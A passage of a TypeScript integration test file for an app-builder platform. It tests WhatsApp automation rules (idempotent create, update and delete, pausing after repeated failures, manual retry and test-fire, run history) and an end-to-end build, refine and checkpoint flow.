          "Build an appointment-management application for a beauty clinic. I need customers, appointments, employees, services, an admin dashboard and automatic appointment status tracking.",
      }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };
    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, { method: "POST", headers: authHeaders(token) });
    await collectSSE(buildRes);

    const headers = { ...authHeaders(token), "x-idempotency-key": "automation-create-repro-key" };
    const ruleBody = {
      trigger: "record_created",
      actionType: "send_whatsapp",
      toMode: "field",
      toField: "phone",
      messageTemplate: "hi",
    };

    const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Customer/automations`, {
      method: "POST",
      headers,
      body: JSON.stringify(ruleBody),
    });
    assert.equal(firstRes.status, 201);
    const first = (await firstRes.json()) as { rule: { id: string } };

    const retryRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Customer/automations`, {
      method: "POST",
      headers,
      body: JSON.stringify(ruleBody),
    });
    assert.equal(retryRes.status, 201);
    const retry = (await retryRes.json()) as { rule: { id: string } };
    assert.equal(retry.rule.id, first.rule.id, "the retry must return the exact same rule, not a newly inserted one");
    assert.deepEqual(retry, first, "the replayed response must be identical to what the first attempt actually returned");

    const listRes = await fetch(`${baseUrl}/api/projects/${project.id}/automations`, { headers: authHeaders(token) });
    const { rules } = (await listRes.json()) as { rules: { id: string }[] };
    assert.equal(rules.length, 1, "exactly one automation rule must exist -- the retry must not have inserted a second row");
  });
});

/**
 * Round 959: hasTooManyConsecutiveFailuresToday's own cap (automations.ts,
 * rounds 924/934/951) was always computed and acted on server-side, but
 * GET /projects/:id/automations never surfaced it -- a rule the scheduler
 * had actually stopped retrying for the rest of today looked identical, in
 * the API response, to one still actively retrying every minute. Drives 5
 * real consecutive failures through runScheduledAutomationsCheck directly
 * (the same mechanism automations.test.ts's own round-924 test uses) to
 * trip the cap, then confirms the list route reports pausedForToday: true
 * for that rule -- and false for an otherwise-untouched record_created
 * rule, since the cap is only ever consulted for a "schedule" trigger.
 */
test("GET /projects/:id/automations reports pausedForToday: true for a schedule rule the scheduler has stopped retrying today, and false for an unrelated record_created rule", async () => {
  await withServer(async (baseUrl, db) => {
    const token = await signup(baseUrl);
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };
    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, { method: "POST", headers: authHeaders(token) });
    await collectSSE(buildRes);

    // Round 959's own GET /automations handler computes pausedForToday
    // against the real wall-clock `new Date()`, not an injected one (there's
    // no route parameter to inject it through) -- unlike automations.test.ts's
    // own round-924 test, which can freely pick a fixed historical date
    // since it calls runScheduledAutomationsCheck directly. scheduleTimeUtc
    // "00:00" keeps the rule due regardless of what time this test happens
    // to run at; the simulated ticks below use the real current moment too,
    // so their triggeredAt genuinely falls on today's real UTC date.
    const scheduleRule = insertAutomationRule(db, {
      projectId: project.id,
      entityName: "Customer",
      trigger: "schedule",
      scheduleTimeUtc: "00:00",
      scheduleDaysOfWeek: null,
      actionType: "send_whatsapp",
      toMode: "static",
      toNumber: "972501234567",
      messageTemplate: "Daily report",
    });
    const unrelatedRule = insertAutomationRule(db, {
      projectId: project.id,
      entityName: "Customer",
      trigger: "record_created",
      actionType: "send_whatsapp",
      toMode: "static",
      toNumber: "972501234567",
      messageTemplate: "Welcome!",
    });

    const fakeManager = {
      getStatus() {
        return { status: "connected" as const, qrDataUrl: null, phoneNumber: "972500000000", error: null };
      },
      async sendMessage() {
        return { ok: false, error: "recipient not found" };
      },
    } as unknown as WhatsAppWebManager;

    for (let i = 0; i < 6; i++) {
      await runScheduledAutomationsCheck(db, fakeManager, createFakeEmailSender(), new Date());
    }

    const listRes = await fetch(`${baseUrl}/api/projects/${project.id}/automations`, { headers: authHeaders(token) });
    const { rules } = (await listRes.json()) as { rules: { id: string; pausedForToday: boolean }[] };
    const pausedRule = rules.find((r) => r.id === scheduleRule.id)!;
    const stillActiveRule = rules.find((r) => r.id === unrelatedRule.id)!;
    assert.equal(pausedRule.pausedForToday, true, "the schedule rule must report paused after 5 consecutive real failures today");
    assert.equal(
      stillActiveRule.pausedForToday,
      false,
      "an unrelated record_created rule must never report paused -- the scheduler's cap is never consulted for it",
    );
  });
});

/**
 * Round 972: once hasTooManyConsecutiveFailuresToday trips (see the
 * pausedForToday test just above), runScheduledAutomationsCheck's own
 * loop stops calling fireScheduledRule for that rule for the rest of the
 * day -- with no new run ever recorded, nothing could clear the pause
 * before this round, even after the user fixed the real problem (here,
 * connecting WhatsApp). Confirms the manual Retry route re-fires a
 * schedule rule's own failed run directly, bypassing that same-day cap
 * for this one explicit attempt, and that a successful retry's own new
 * "sent" run naturally un-pauses the rest of today's automatic ticks too
 * (hasTooManyConsecutiveFailuresToday looks at the most recent runs --
 * the newest one no longer being "failed" breaks the streak).
 */
test("POST .../automations/:ruleId/runs/:runId/retry re-fires a PAUSED schedule rule's own failed run, and a successful retry un-pauses it", async () => {
  let createdSockets: ReturnType<typeof createFakeWhatsAppSocket>[] = [];
  await withServer(
    async (baseUrl, db) => {
      const email = `retry-unpause-${randomUUID()}@example.com`;
      const token = await signup(baseUrl, email);
      const owner = findUserByEmail(db, email)!;

      const spec: ProductSpec = {
        summary: "test",
        personas: [],
        roles: ["Admin"],
        entities: [{ name: "Reminder", fields: [{ name: "title", type: "text", required: true }] }],
        screens: [],
        assumptions: [],
        openQuestions: [],
      };
      const projectId = randomUUID();
      insertProject(db, { id: projectId, ownerId: owner.id, name: "Reminders", description: "test", spec });
      diffAndMigrate(db, projectId, undefined, spec);
      markProjectBuilt(db, projectId);

      const scheduleRule = insertAutomationRule(db, {
        projectId,
        entityName: "Reminder",
        trigger: "schedule",
        scheduleTimeUtc: "00:00",
        scheduleDaysOfWeek: null,
        actionType: "send_whatsapp",
        toMode: "static",
        toNumber: "972501234567",
        messageTemplate: "Daily reminder report",
      });

      // Trips the pause via 6 consecutive REAL failures (not "WhatsApp
      // not connected", which round 934 deliberately excludes from this
      // count) -- a separate fake manager purely for seeding
      // automation_runs history, independent of the real (still
      // disconnected) manager withServer itself constructed the actual
      // HTTP routes around.
      const alwaysFailsManager = {
        getStatus() {
          return { status: "connected" as const, qrDataUrl: null, phoneNumber: "972500000000", error: null };
        },
        async sendMessage() {
          return { ok: false, error: "recipient not found" };
        },
      } as unknown as WhatsAppWebManager;
      for (let i = 0; i < 6; i++) {
        await runScheduledAutomationsCheck(db, alwaysFailsManager, createFakeEmailSender(), new Date());
      }

      const beforeRes = await fetch(`${baseUrl}/api/projects/${projectId}/automations`, { headers: authHeaders(token) });
      const { rules: beforeRules } = (await beforeRes.json()) as { rules: { id: string; pausedForToday: boolean }[] };
      assert.equal(beforeRules.find((r) => r.id === scheduleRule.id)!.pausedForToday, true, "the rule must be paused before the retry");

      const runsRes = await fetch(`${baseUrl}/api/projects/${projectId}/automations/${scheduleRule.id}/runs`, { headers: authHeaders(token) });
      const { runs } = (await runsRes.json()) as { runs: { id: string; status: string }[] };
      assert.equal(runs[0]!.status, "failed");

      // The user fixes the real problem -- connects WhatsApp through the
      // REAL manager the HTTP routes (including the retry route below)
      // actually use.
      await fetch(`${baseUrl}/api/projects/${projectId}/integrations/whatsapp/connect`, { method: "POST", headers: authHeaders(token) });
      createdSockets[0].sock.user = { id: "15550001111:1@s.whatsapp.net" };
      createdSockets[0].emitConnectionUpdate({ connection: "open" });

      const retryRes = await fetch(`${baseUrl}/api/projects/${projectId}/automations/${scheduleRule.id}/runs/${runs[0]!.id}/retry`, {
        method: "POST",
        headers: authHeaders(token),
      });
      assert.equal(retryRes.status, 200);
      const { run: retryRun } = (await retryRes.json()) as { run: { status: string } | null };
      assert.equal(retryRun?.status, "sent", "WhatsApp is connected now, so the manually-retried send must actually succeed");
      assert.equal(createdSockets[0].sendCalls.length, 1);

      const afterRes = await fetch(`${baseUrl}/api/projects/${projectId}/automations`, { headers: authHeaders(token) });
      const { rules: afterRules } = (await afterRes.json()) as { rules: { id: string; pausedForToday: boolean }[] };
      assert.equal(
        afterRules.find((r) => r.id === scheduleRule.id)!.pausedForToday,
        false,
        "a successful manual retry must un-pause the rule for the rest of today too, not just record one extra successful send",
      );
    },
    {
      whatsapp: (db) => {
        const { manager, createdSockets: sockets } = createTestWhatsAppManager(db);
        createdSockets = sockets;
        return manager;
      },
    },
  );
});

/**
 * Round 997: before this route, the ONLY way to find out whether a
 * newly-created rule's destination/credentials/template actually worked
 * was to wait for a real trigger event (or, for a schedule rule, its own
 * next due time) and then check the run history after the fact. This
 * route fires a rule right now, on demand, through the exact same
 * fireRule/fireScheduledRule logic the real triggers and the retry route
 * both already go through.
 */
test("POST .../automations/:ruleId/test fires a schedule rule immediately (bypassing its own due time), and a record-triggered rule against the entity's most recent record, rejecting with a clear error when none exist", async () => {
  let createdSockets: ReturnType<typeof createFakeWhatsAppSocket>[] = [];
  await withServer(
    async (baseUrl, db) => {
      const email = `automation-test-send-${randomUUID()}@example.com`;
      const token = await signup(baseUrl, email);
      const owner = findUserByEmail(db, email)!;

      const spec: ProductSpec = {
        summary: "test",
        personas: [],
        roles: ["Admin"],
        entities: [
          {
            name: "Order",
            fields: [
              { name: "customerName", type: "text", required: true },
              { name: "customerPhone", type: "text", required: false },
            ],
          },
        ],
        screens: [],
        assumptions: [],
        openQuestions: [],
      };
      const projectId = randomUUID();
      insertProject(db, { id: projectId, ownerId: owner.id, name: "Orders", description: "test", spec });
      diffAndMigrate(db, projectId, undefined, spec);
      markProjectBuilt(db, projectId);

      await fetch(`${baseUrl}/api/projects/${projectId}/integrations/whatsapp/connect`, { method: "POST", headers: authHeaders(token) });
      createdSockets[0].sock.user = { id: "15550001111:1@s.whatsapp.net" };
      createdSockets[0].emitConnectionUpdate({ connection: "open" });

      // A schedule rule set far in the future -- isScheduledRuleDue would
      // say "not due" for hours; the test route must fire it anyway,
      // proving it calls fireScheduledRule directly rather than going
      // through the normal due-time gate.
      const scheduleRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Order/automations`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({
          trigger: "schedule",
          scheduleTimeUtc: "23:59",
          actionType: "send_whatsapp",
          toMode: "static",
          toNumber: "972500000000",
          messageTemplate: "Daily report",
        }),
      });
      const { rule: scheduleRule } = (await scheduleRes.json()) as { rule: { id: string } };

      const scheduleTestRes = await fetch(`${baseUrl}/api/projects/${projectId}/automations/${scheduleRule.id}/test`, {
        method: "POST",
        headers: authHeaders(token),
      });
      assert.equal(scheduleTestRes.status, 200);
      const { run: scheduleRun } = (await scheduleTestRes.json()) as { run: { status: string } | null };
      assert.equal(scheduleRun?.status, "sent", "WhatsApp is connected, so the on-demand test fire must actually succeed");
      assert.equal(createdSockets[0].sendCalls.length, 1);

      // A record-triggered rule on an entity with no records yet at all.
      const recordRuleRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Order/automations`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({
          trigger: "record_created",
          actionType: "send_whatsapp",
          toMode: "field",
          toField: "customerPhone",
          messageTemplate: "Hi {{customerName}}!",
        }),
      });
      const { rule: recordRule } = (await recordRuleRes.json()) as { rule: { id: string } };

      const noRecordsRes = await fetch(`${baseUrl}/api/projects/${projectId}/automations/${recordRule.id}/test`, {
        method: "POST",
        headers: authHeaders(token),
      });
      assert.equal(noRecordsRes.status, 400, "there are no records yet to test a record-triggered rule against");
      assert.equal(((await noRecordsRes.json()) as { code?: string }).code, "AUTOMATION_TEST_NO_RECORDS");
      assert.equal(createdSockets[0].sendCalls.length, 1, "the rejected test must never have attempted a send");

      // Two records created -- the test must fire against the most
      // RECENT one, not the first. x-suppress-automations on both keeps
      // recordRule's own real record_created firing from polluting
      // sendCalls, so it stays attributable only to the explicit /test
      // calls below.
      await fetch(`${baseUrl}/api/projects/${projectId}/entities/Order`, {
        method: "POST",
        headers: { ...authHeaders(token), "x-suppress-automations": "true" },
        body: JSON.stringify({ customerName: "Older Customer", customerPhone: "972500000001" }),
      });
      await fetch(`${baseUrl}/api/projects/${projectId}/entities/Order`, {
        method: "POST",
        headers: { ...authHeaders(token), "x-suppress-automations": "true" },
        body: JSON.stringify({ customerName: "Newest Customer", customerPhone: "972500000002" }),
      });

      const recordTestRes = await fetch(`${baseUrl}/api/projects/${projectId}/automations/${recordRule.id}/test`, {
        method: "POST",
        headers: authHeaders(token),
      });
      assert.equal(recordTestRes.status, 200);
      const { run: recordRun } = (await recordTestRes.json()) as { run: { status: string } | null };
      assert.equal(recordRun?.status, "sent");
      assert.equal(createdSockets[0].sendCalls.length, 2);
      assert.equal(createdSockets[0].sendCalls[1]!.text, "Hi Newest Customer!", "the test must fire against the most recently created record, not the first");
    },
    {
      whatsapp: (db) => {
        const { manager, createdSockets: sockets } = createTestWhatsAppManager(db);
        createdSockets = sockets;
        return manager;
      },
    },
  );
});

/**
 * Round 1261: this route's own test above already confirms a schedule
 * rule's Test bypasses isScheduledRuleDue's due-time gate -- but it never
 * checked the SIDE EFFECT of that successful fire: fireScheduledRule used
 * to unconditionally update the rule's own lastTriggeredAt/lastStatus, the
 * exact two columns isScheduledRuleDue later reads to decide whether
 * today's REAL scheduled occurrence has already happened. A rule tested
 * successfully would then never actually fire at its own scheduled time
 * later that same day -- directly contradicting Test's own purpose
 * (verify a rule works "immediately instead of waiting for... its own
 * next due time", not replace that occurrence). Confirms via the real
 * GET .../automations list response (which spreads the rule's own raw
 * row, lastTriggeredAt included) that a successful test leaves it null.
 */
test("a successful Test of a schedule rule leaves its own lastTriggeredAt/lastStatus untouched, so the real scheduler still considers it due later the same day", async () => {
  let createdSockets: ReturnType<typeof createFakeWhatsAppSocket>[] = [];
  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl, `schedule-test-no-mark-${randomUUID()}@example.com`);
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };
      const entityName = project.spec.entities[0].name;

      await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/connect`, { method: "POST", headers: authHeaders(token) });
      createdSockets[0].sock.user = { id: "15550001111:1@s.whatsapp.net" };
      createdSockets[0].emitConnectionUpdate({ connection: "open" });

      const ruleRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/automations`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({
          trigger: "schedule",
          scheduleTimeUtc: "09:00",
          actionType: "send_whatsapp",
          toMode: "static",
          toNumber: "972500000000",
          messageTemplate: "Daily report",
        }),
      });
      const { rule } = (await ruleRes.json()) as { rule: { id: string } };

      const testRes = await fetch(`${baseUrl}/api/projects/${project.id}/automations/${rule.id}/test`, { method: "POST", headers: authHeaders(token) });
      assert.equal(testRes.status, 200);
      const { run } = (await testRes.json()) as { run: { status: string } | null };
      assert.equal(run?.status, "sent", "WhatsApp is connected, so the test must genuinely succeed");

      const listRes = await fetch(`${baseUrl}/api/projects/${project.id}/automations`, { headers: authHeaders(token) });
      const { rules } = (await listRes.json()) as { rules: { id: string; lastTriggeredAt: string | null; lastStatus: string | null }[] };
      const afterTest = rules.find((r) => r.id === rule.id)!;
      assert.equal(afterTest.lastTriggeredAt, null, "a successful test must never mark the rule as having fired for real");
      assert.equal(afterTest.lastStatus, null);
    },
    {
      whatsapp: (db) => {
        const { manager, createdSockets: sockets } = createTestWhatsAppManager(db);
        createdSockets = sockets;
        return manager;
      },
    },
  );
});

/**
 * Round 953: the sibling POST (create) route above already got
 * withIdempotency protection in round 600; this PATCH route never did.
 * fetchWithWakeRetry retries on ANY thrown fetch() error, so a response
 * lost in transit after an update already succeeded meant the retry
 * re-applied the same patch against the now-already-updated rule --
 * harmless for this specific patch, but the same "re-running validation
 * against state the first call already changed" class round 943 fixed
 * for roles/assumptions/personas.
 */
test("PATCH /projects/:id/automations/:ruleId retried with the same idempotency key after the first attempt already succeeded replays the original response instead of re-running validation", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "automation-patch-idem1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };
    const entityName = project.spec.entities[0].name;

    const ruleRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/automations`, {
      method: "POST",
      headers: { ...authHeaders(token), "x-idempotency-key": "automation-patch-seed-key" },
      body: JSON.stringify({ trigger: "record_created", actionType: "send_whatsapp", toMode: "static", toNumber: "972500000000", messageTemplate: "hi" }),
    });
    const { rule } = (await ruleRes.json()) as { rule: { id: string } };

    const headers = { ...authHeaders(token), "x-idempotency-key": "automation-patch-repro-key" };
    const patchBody = { messageTemplate: "updated message" };

    const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}/automations/${rule.id}`, { method: "PATCH", headers, body: JSON.stringify(patchBody) });
    assert.equal(firstRes.status, 200);
    const first = (await firstRes.json()) as { rule: { messageTemplate: string } };
    assert.equal(first.rule.messageTemplate, "updated message");

    const retryRes = await fetch(`${baseUrl}/api/projects/${project.id}/automations/${rule.id}`, { method: "PATCH", headers, body: JSON.stringify(patchBody) });
    assert.equal(retryRes.status, 200, "a retried update with the same idempotency key must replay the original success, not re-run validation against the already-updated rule");
    const retry = (await retryRes.json()) as { rule: { messageTemplate: string } };
    assert.deepEqual(retry, first, "the replayed response must match the original success exactly");
  });
});

/**
 * Round 953: same withIdempotency() extension as the PATCH route just
 * above -- see its own comment. deleteAutomationRule
 * (packages/db/src/automations.ts) throws NotFoundError once the row is
 * already gone, with no special case for a retry.
 */
test("DELETE /projects/:id/automations/:ruleId retried with the same idempotency key after the first attempt already succeeded replays the original 204, instead of 404ing on the already-deleted rule", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "automation-delete-idem1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };
    const entityName = project.spec.entities[0].name;

    const ruleRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/automations`, {
      method: "POST",
      headers: { ...authHeaders(token), "x-idempotency-key": "automation-delete-seed-key" },
      body: JSON.stringify({ trigger: "record_created", actionType: "send_whatsapp", toMode: "static", toNumber: "972500000000", messageTemplate: "hi" }),
    });
    const { rule } = (await ruleRes.json()) as { rule: { id: string } };

    const headers = { ...authHeaders(token), "x-idempotency-key": "automation-delete-repro-key" };
    const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}/automations/${rule.id}`, { method: "DELETE", headers });
    assert.equal(firstRes.status, 204);

    const getAfterFirst = await fetch(`${baseUrl}/api/projects/${project.id}/automations`, { headers: authHeaders(token) });
    const { rules: afterFirst } = (await getAfterFirst.json()) as { rules: { id: string }[] };
    assert.equal(afterFirst.length, 0, "the rule must genuinely be gone after the first call");

    const retryRes = await fetch(`${baseUrl}/api/projects/${project.id}/automations/${rule.id}`, { method: "DELETE", headers });
    assert.equal(
      retryRes.status,
      204,
      "a retried deletion with the same idempotency key must replay the original success, not 404 on the already-deleted rule",
    );
  });
});

/**
 * Round 682: a rule's own lastTriggeredAt/lastStatus/lastError (already
 * returned by GET /automations) only ever showed the single most recent
 * firing -- a rule that failed repeatedly and then happened to succeed on
 * its latest attempt looked perfectly healthy. GET .../runs surfaces the
 * real run-by-run history (packages/db/src/automations.ts's own
 * automation_runs table).
 */
test("GET /projects/:id/automations/:ruleId/runs returns that rule's real run history, newest first, scoped to the right rule and project", async () => {
  await withServer(async (baseUrl, db) => {
    const token = await signup(baseUrl, "automation-runs1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };
    const entityName = project.spec.entities[0].name;

    const ruleRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ trigger: "record_created", actionType: "send_whatsapp", toMode: "static", toNumber: "972501234567", messageTemplate: "hi" }),
    });
    const { rule } = (await ruleRes.json()) as { rule: { id: string } };

    const emptyRunsRes = await fetch(`${baseUrl}/api/projects/${project.id}/automations/${rule.id}/runs`, {
      headers: authHeaders(token),
    });
    assert.equal(emptyRunsRes.status, 200);
    assert.deepEqual((await emptyRunsRes.json()) as { runs: unknown[] }, { runs: [] }, "a rule that's never fired must return an empty run list, not an error");

    recordAutomationRun(db, project.id, rule.id, { status: "failed", error: "WhatsApp not connected" });
    await new Promise((r) => setTimeout(r, 2));
    recordAutomationRun(db, project.id, rule.id, { status: "sent" });

    const runsRes = await fetch(`${baseUrl}/api/projects/${project.id}/automations/${rule.id}/runs`, {
      headers: authHeaders(token),
    });
    assert.equal(runsRes.status, 200);
    const { runs } = (await runsRes.json()) as { runs: { status: string; error: string | null; ruleId: string }[] };
    assert.equal(runs.length, 2);
    assert.deepEqual(
      runs.map((r) => r.status),
      ["sent", "failed"],
      "must be ordered newest-first",
    );
    assert.equal(runs[1].error, "WhatsApp not connected");
    assert.equal(runs[0].error, null);
    for (const run of runs) assert.equal(run.ruleId, rule.id);

    const notFoundRes = await fetch(`${baseUrl}/api/projects/${project.id}/automations/nonexistent-rule/runs`, {
      headers: authHeaders(token),
    });
    assert.equal(notFoundRes.status, 404);
    assert.equal(((await notFoundRes.json()) as { code?: string }).code, "AUTOMATION_RULE_NOT_FOUND");
  });
});

/**
 * Round 474 closes the design doc's other identified residual gap:
 * POST /projects/:id/answers. Unlike /build and /refine, this route
 * returns a plain JSON response (not an SSE stream) -- confirmed by
 * reading the route directly before implementing -- so it fits
 * withIdempotency() exactly like the five routes already converted.
 * A call-counting provider proves generateSpec() only runs once for the
 * retry, not just that the response looks the same (the heuristic
 * provider is a pure function of its input, so a second real call would
 * produce an identical spec anyway -- only the call count reveals whether
 * the second request actually ran the work or replayed the first).
 */
test("POST /projects/:id/answers retried with the same idempotency key after the first attempt already finished replays the original response instead of calling generateSpec a second time", async () => {
  let calls = 0;
  const inner = new HeuristicSpecProvider();
  const provider: SpecProvider = {
    name: inner.name,
    async generate(description) {
      calls += 1;
      return inner.generate(description);
    },
  };
  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl, "answers-idem1@example.com");
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as {
        project: { id: string; spec: { openQuestions: { question: string }[] } };
      };
      const question = project.spec.openQuestions[0];
      assert.ok(question, "the heuristic provider should ask at least one open question here");
      calls = 0; // reset after the create call above, which also calls generate()

      const headers = { ...authHeaders(token), "x-idempotency-key": "answers-repro-key" };
      const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}/answers`, {
        method: "POST",
        headers,
        body: JSON.stringify({ answers: [{ question: question.question, answer: "Yes, use Stripe for all payments" }] }),
      });
      assert.equal(firstRes.status, 200);
      const first = await firstRes.json();
      assert.equal(calls, 1, "the first attempt must actually call generateSpec once");

      const retryRes = await fetch(`${baseUrl}/api/projects/${project.id}/answers`, {
        method: "POST",
        headers,
        body: JSON.stringify({ answers: [{ question: question.question, answer: "Yes, use Stripe for all payments" }] }),
      });
      assert.equal(retryRes.status, 200);
      const retry = await retryRes.json();
      assert.equal(calls, 1, "the retry must not call generateSpec a second time");
      assert.deepEqual(retry, first, "the retry must replay the original response exactly");
    },
    { provider },
  );
});

test("full acceptance flow: idea -> spec -> AI build pipeline -> CRUD -> refine -> checkpoints", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl);

    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({
        description:
          "Build an appointment-management application for a beauty clinic. I need customers, appointments, employees, services, an admin dashboard and automatic appointment status tracking.",
      }),
    });
    assert.equal(createRes.status, 201);
    const created = (await createRes.json()) as {
      project: { id: string; spec: { entities: { name: string }[] } };
      providerName: string;
    };
    assert.equal(created.providerName, "heuristic");
    const projectId = created.project.id;
    assert.deepEqual(
      created.project.spec.entities.map((e) => e.name).sort(),
      ["Appointment", "Customer", "Employee", "Service"],
    );

    // Before build, entity data endpoints must refuse.
    const beforeBuild = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer`, {
      headers: authHeaders(token),
    });
    assert.equal(beforeBuild.status, 409);

    // Run the real streaming build pipeline and verify every agent reported in.
    const buildRes = await fetch(`${baseUrl}/api/projects/${projectId}/build`, {
      method: "POST",
      headers: authHeaders(token),
    });
    assert.equal(buildRes.status, 200);
    const buildEvents = await collectSSE(buildRes);
    const agentsSeen = new Set(buildEvents.map((e) => e.agent));
    for (const agent of ["Architect", "Database", "Seed Data", "QA", "Security", "Forge"]) {
      assert.ok(agentsSeen.has(agent as AgentStepEvent["agent"]), `expected a ${agent} step`);
    }
    assert.ok(buildEvents.every((e) => e.status !== "failed"), "no agent step should fail on a clean build");
    const finalEvent = buildEvents[buildEvents.length - 1];
    assert.equal(finalEvent.agent, "Forge");
    const finalProject = (finalEvent.detail as { project: { status: string } }).project;
    assert.equal(finalProject.status, "built");

    // Seed data agent should have populated each new entity.
    const customerList = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer`, {
      headers: authHeaders(token),
    });
    const { records: seededCustomers } = (await customerList.json()) as { records: unknown[] };
    assert.equal(seededCustomers.length, 2);

    // Generic CRUD still works exactly as before.
    const createRecordRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ name: "Dana Levi", email: "dana@example.com", status: "New" }),
    });
    assert.equal(createRecordRes.status, 201);
    const { record } = (await createRecordRes.json()) as { record: { id: number; name: string } };

    const updateRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer/${record.id}`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ status: "Won" }),
    });
    assert.equal(updateRes.status, 200);

    const deleteRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer/${record.id}`, {
      method: "DELETE",
      headers: authHeaders(token),
    });
    assert.equal(deleteRes.status, 204);

    // A non-numeric :recordId must be rejected with a clean 400, not fall
    // through to Number() producing NaN and a confusing "Record NaN not
    // found" 404 that leaks the raw coercion result.
    const badPatchRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer/not-a-number`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ status: "Won" }),
    });
    assert.equal(badPatchRes.status, 400);
    const badPatchBody = (await badPatchRes.json()) as { code?: string; error?: string };
    assert.equal(badPatchBody.code, "VALIDATION_ERROR");
    assert.ok(!badPatchBody.error?.includes("NaN"));

    const badDeleteRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer/not-a-number`, {
      method: "DELETE",
      headers: authHeaders(token),
    });
    assert.equal(badDeleteRes.status, 400);
    const badDeleteBody = (await badDeleteRes.json()) as { code?: string; error?: string };
    assert.equal(badDeleteBody.code, "VALIDATION_ERROR");
    assert.ok(!badDeleteBody.error?.includes("NaN"));

    // Refine: add a brand-new entity via natural language, additive-only.
    const refineRes = await fetch(`${baseUrl}/api/projects/${projectId}/refine`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ instruction: "Also track invoices and orders for customers." }),
    });
    assert.equal(refineRes.status, 200);
    const refineEvents = await collectSSE(refineRes);
    assert.ok(refineEvents.every((e) => e.status !== "failed"), "refine should succeed on valid input");
    const refineFinal = refineEvents[refineEvents.length - 1];
    const refinedProject = (refineFinal.detail as { project: { spec: { entities: { name: string }[] } } }).project;
    const refinedNames = refinedProject.spec.entities.map((e) => e.name);
    assert.ok(refinedNames.includes("Invoice") || refinedNames.includes("Order"), "refine should add a new entity");

    // Original Customer data must have survived the refine untouched.
    const customersAfterRefine = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer`, {
      headers: authHeaders(token),
    });
    const { records: customersAfter } = (await customersAfterRefine.json()) as { records: unknown[] };
    assert.equal(customersAfter.length, 2); // the two seeded records; the manually created one was deleted

    // Time Machine: two checkpoints should exist (initial build + refine).
    const checkpointsRes = await fetch(`${baseUrl}/api/projects/${projectId}/checkpoints`, {
      headers: authHeaders(token),
    });
    assert.equal(checkpointsRes.status, 200);
    const { checkpoints } = (await checkpointsRes.json()) as { checkpoints: { id: string; label: string }[] };
    assert.equal(checkpoints.length, 2);
    const initialCheckpoint = checkpoints.find((c) => c.label === "Initial build")!;
    assert.ok(initialCheckpoint);

    // Restoring the initial checkpoint should hide the entity added by refine again.
    const restoreRes = await fetch(
      `${baseUrl}/api/projects/${projectId}/checkpoints/${initialCheckpoint.id}/restore`,
      { method: "POST", headers: authHeaders(token) },
    );
    assert.equal(restoreRes.status, 200);
    const { project: restoredProject } = (await restoreRes.json()) as {
      project: { spec: { entities: { name: string }[] } };
    };
    assert.deepEqual(
      restoredProject.spec.entities.map((e) => e.name).sort(),
      ["Appointment", "Customer", "Employee", "Service"],
    );
  });
});

/**
 * Round 708: isHebrewText only checks whether its input contains at least
 * one Hebrew character, not which language dominates. Both /refine and
 * /answers build combinedDescription by concatenating the project's own
